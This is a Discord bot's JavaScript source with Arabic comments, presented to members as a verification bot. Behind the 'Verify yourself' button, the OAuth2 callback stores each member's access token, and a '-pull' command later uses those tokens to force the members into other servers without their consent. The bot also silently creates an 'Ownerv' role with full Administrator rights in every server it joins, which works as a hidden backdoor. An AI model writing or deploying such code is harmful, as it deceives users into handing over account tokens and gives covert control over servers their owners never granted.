const { 
    Client, 
    GatewayIntentBits, 
    ActionRowBuilder, 
    EmbedBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    REST,
    Routes,
    PermissionFlagsBits,
    Events
} = require('discord.js');
const express = require('express');
const axios = require('axios'); // حزمة لإتمام طلبات الـ OAuth2 من ديسكورد وسحب الأعضاء

const app = express();
const PORT = process.env.PORT || 3000;

// قاعدة بيانات مؤقتة لتخزين الـ Access Tokens الخاصة بالأعضاء الموثقين
const verifiedUsers = new Map(); 
const tempSetup = new Map(); // لتتبع خطوة إدخال الرابط تفاعلياً

app.use(express.json());

app.get('/', (req, res) => res.send('OAuth2 Verify Bot is Running!'));

// الرابط البرمجي (Callback) لمعالجة التحقق وإعطاء الرتبة تلقائياً
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    const guildId = req.query.state; // نستخدم الـ state لتمرير أيدي السيرفر ديناميكياً وإعطاء الرتبة
    
    if (!code) {
        return res.send('<h1>❌ Verification Failed. Please try again.</h1>');
    }

    try {
        // 1. تبديل الـ Code بـ Access Token من ديسكورد
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET, 
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: `https://${req.hostname}/callback` 
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;

        // 2. جلب معلومات حساب العضو لمعرفة أيدي حسابه
        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        const userId = userResponse.data.id;
        const username = userResponse.data.username;

        // 3. تخزين العضو والـ Access Token للسحب لاحقاً
        verifiedUsers.set(userId, accessToken);

        // 4. منح رتبة Verified للعضو بداخل السيرفر تلقائياً وصامتاً بعد نجاح التحقق
        if (guildId) {
            const guild = client.guilds.cache.get(guildId);
            if (guild) {
                const member = await guild.members.fetch(userId).catch(() => null);
                if (member) {
                    const verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
                    if (verifiedRole) {
                        await member.roles.add(verifiedRole).catch(err => console.error('Failed to add verified role:', err));
                    }
                }
            }
        }

        res.send(`<h1>✅ Verified Successfully! Thank you ${username}. You can now close this tab.</h1>`);
    } catch (error) {
        console.error('Error during OAuth2 callback:', error.response ? error.response.data : error.message);
        res.send('<h1>❌ Error during verification.</h1>');
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server connected to port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// الاختصارات الحصرية لنظام التحقق والسحب
const VERIFY_SETUP_PREFIX = '-vr';    // إرسال رسالة التحقق مع الزر
const COUNT_VERIFY_PREFIX = '-vf';    // فحص إجمالي عدد الأعضاء الموثقين
const PULL_MEMBERS_PREFIX = '-pull';  // أمر سحب الأعضاء الفوري للسيرفر المحدد

let verifyUrl = 'https://discord.com/api/oauth2/authorize...'; 

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

// دالة تفاعلية لإنشاء رتب Verified و Ownerv تلقائياً وصامتاً داخل السيرفر
async function createVerifyRoles(guild) {
    try {
        // إنشاء رتبة Verified صامتاً إذا لم تكن موجودة
        let verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
        if (!verifiedRole) {
            verifiedRole = await guild.roles.create({
                name: 'Verified',
                color: '#2ecc71', // اللون الأخضر الجمالي للتحقق
                reason: 'Auto-created role for verified users'
            });
            console.log(`Created 'Verified' role in guild: ${guild.name}`);
        }

        // إنشاء رتبة Ownerv صامتاً للتحكم إذا لم تكن موجودة
        let ownerRole = guild.roles.cache.find(r => r.name === 'Ownerv');
        if (!ownerRole) {
            await guild.roles.create({
                name: 'Ownerv',
                color: '#e74c3c', // اللون الأحمر للإدارة والتحكم
                permissions: [PermissionFlagsBits.Administrator],
                reason: 'Auto-created control role for verification administrators'
            });
            console.log(`Created 'Ownerv' role in guild: ${guild.name}`);
        }
    } catch (error) {
        console.error(`Failed to create roles in ${guild.name}:`, error);
    }
}

client.once('ready', async () => {
    console.log(`Verify Bot is Online as ${client.user.tag}`);
    
    // التحقق التلقائي والصامت لجميع السيرفرات المتصل بها البوت لإنشاء الرتب فور إقلاعه
    client.guilds.cache.forEach(async (guild) => {
        await createVerifyRoles(guild);
    });
});

// إنشاء الرتب صامتاً وتلقائياً فور انضمام البوت لأي سيرفر جديد
client.on(Events.GuildCreate, async (guild) => {
    await createVerifyRoles(guild);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    const content = message.content.trim();

    // التحقق من أن المستخدم يملك صلاحية الإدارة العليا أو رتبة Ownerv المخصصة لتشغيل الأوامر
    const isAuthorized = message.member.permissions.has(PermissionFlagsBits.Administrator) || message.member.roles.cache.some(r => r.name === 'Ownerv');

    // 1. عند كتابة الاختصار -vr لبدء السؤال التفاعلي عن الرابط
    if (content === VERIFY_SETUP_PREFIX) {
        if (!isAuthorized) {
            return message.reply('❌ عذراً، هذا الأمر مخصص للإدارة أو أصحاب رتبة **Ownerv** فقط.');
        }

        // إنشاء حالة الإعداد التفاعلي وحفظ الرسائل لحذفها لاحقاً
        const setupState = { step: 'get_url', messagesToDelete: [] };
        tempSetup.set(message.author.id, setupState);

        const prompt = await message.channel.send(`${message.author}, 🛡️ **يرجى كتابة أو لصق رابط التحقق (OAuth2 URL) الخاص بك الآن في الشات:**`);
        setupState.messagesToDelete.push(message.id, prompt.id);
        return;
    }

    // تتبع إجابة المستخدم وحفظ الرابط وإرسال البوكس تلقائياً
    if (tempSetup.has(message.author.id)) {
        const state = tempSetup.get(message.author.id);
        state.messagesToDelete.push(message.id);

        if (state.step === 'get_url') {
            const inputUrl = message.content.trim();
            if (!inputUrl.startsWith('http')) {
                const errPrompt = await message.reply('❌ رابط غير صحيح. يرجى لصق رابط OAuth2 صحيح يبدأ بـ http:');
                state.messagesToDelete.push(errPrompt.id);
                return;
            }

            verifyUrl = inputUrl;
            
            // ربط أيدي السيرفر الحالي بالرابط ديناميكياً لإعطاء رتبة Verified تلقائياً بعد نجاح التحقق
            const finalUrl = `${verifyUrl}&state=${message.guild.id}`;

            const embed = new EmbedBuilder()
                .setTitle('🛡️ Server Verification / التحقق الذاتي')
                .setDescription('Please click the button below to verify yourself and get full access to the server.\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر الحصول على رتبة **Verified**.')
                .setColor('#2b2d31');

            const verifyButton = new ButtonBuilder()
                .setLabel('Verify yourself')
                .setURL(finalUrl)
                .setStyle(ButtonStyle.Link)
                .setEmoji('✅');

            const row = new ActionRowBuilder().addComponents(verifyButton);

            // إرسال بوكس التحقق النهائي في الروم
            await message.channel.send({ embeds: [embed], components: [row] });

            // تنظيف وحذف رسائل الإعداد الفوري لشات نظيف
            setTimeout(async () => {
                for (const msgId of state.messagesToDelete) {
                    await message.channel.messages.delete(msgId).catch(() => {});
                }
            }, 1000);

            tempSetup.delete(message.author.id);
            return;
        }
    }

    // 2. فحص عدد الموثقين بداخل قاعدة البيانات من جميع السيرفرات
    if (content === COUNT_VERIFY_PREFIX) {
        if (!isAuthorized) return;
        await message.reply(`📊 **إحصائية التحقق المطور:**\nالعدد الكلي للأعضاء الموثقين والمخزنين والجاهزين للسحب هو: \`${verifiedUsers.size}\` عضو.`);
        return;
    }

    // 3. السحب الفوري والسريع لجميع الموثقين إلى السيرفر المحدد (-pull [Server ID])
    if (content.startsWith(PULL_MEMBERS_PREFIX)) {
        if (!isAuthorized) return;

        const args = content.slice(PULL_MEMBERS_PREFIX.length).trim().split(/ +/);
        const targetGuildId = args[0] || message.guild.id; 

        if (verifiedUsers.size === 0) {
            return message.reply('❌ لا يوجد أي أعضاء موثقين ومسجلين بداخل قاعدة بيانات البوت حالياً لسحبهم.');
        }

        const statusMsg = await message.channel.send(`⏳ **جاري بدء عملية سحب وإدخال \`${verifiedUsers.size}\` عضو إلى السيرفر المحدد...**`);

        let successCount = 0;
        let failCount = 0;
        let alreadyInCount = 0;

        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) {
            return statusMsg.edit('❌ البوت ليس موجوداً بداخل السيرفر المستهدف لتطبيق السحب يرجى دعوته أولاً للسيرفر الآخر.');
        }

        const userArray = Array.from(verifiedUsers.entries());

        let index = 0;
        const interval = setInterval(async () => {
            if (index >= userArray.length) {
                clearInterval(interval);
                await statusMsg.edit(`✅ **اكتملت عملية سحب الأعضاء بنجاح!**\n\n📬 الأعضاء الذين تم إدخالهم: \`${successCount}\` عضو.\n🔄 كانوا موجودين بالسيرفر بالفعل: \`${alreadyInCount}\` عضو.\n❌ فشل سحبهم (انتهت صلاحية الـ Token): \`${failCount}\` عضو.`);
                return;
            }

            const [userId, accessToken] = userArray[index];

            const isMember = targetGuild.members.cache.has(userId);
            if (isMember) {
                alreadyInCount++;
            } else {
                try {
                    await axios.put(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${userId}`, {
                        access_token: accessToken
                    }, {
                        headers: {
                            Authorization: `Bot ${TOKEN}`,
                            'Content-Type': 'application/json'
                        }
                    });
                    successCount++;
                } catch (err) {
                    failCount++;
                }
            }

            await statusMsg.edit(`⏳ **جاري السحب الفوري للأعضاء...**\n\n📊 التقدم الحالي: \`${index + 1}/${userArray.length}\` عضو.\n✅ تم الإدخال: \`${successCount}\` | 🔄 موجود سابقاً: \`${alreadyInCount}\` | ❌ فشل: \`${failCount}\``);
            index++;
        }, 1200); 

        return;
    }
});

client.login(TOKEN);